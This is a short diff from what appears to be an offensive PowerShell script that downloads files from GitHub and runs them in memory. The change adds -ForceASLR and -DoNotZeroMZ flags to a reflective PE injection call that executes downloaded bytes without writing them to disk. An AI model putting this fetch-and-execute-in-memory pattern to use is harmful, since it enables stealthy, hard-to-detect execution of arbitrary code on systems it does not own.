@@ -2971,7 +2971,7 @@ Use this script to download files from GitHub and store on disk or run in memory
 	if ($PsCmdlet.ParameterSetName -eq "ExecutionCommands")
 	{
 		# To run the exe in memory use Invoke-ReflectivePEInjection
-		$output = Invoke-ReflectivePEInjection -PEBytes $fileBytes -ExeArgs $CommandArgs
+		$output = Invoke-ReflectivePEInjection -ForceASLR -DoNotZeroMZ -PEBytes $fileBytes -ExeArgs $CommandArgs
             	#Write-Host $output
 	}		
 		
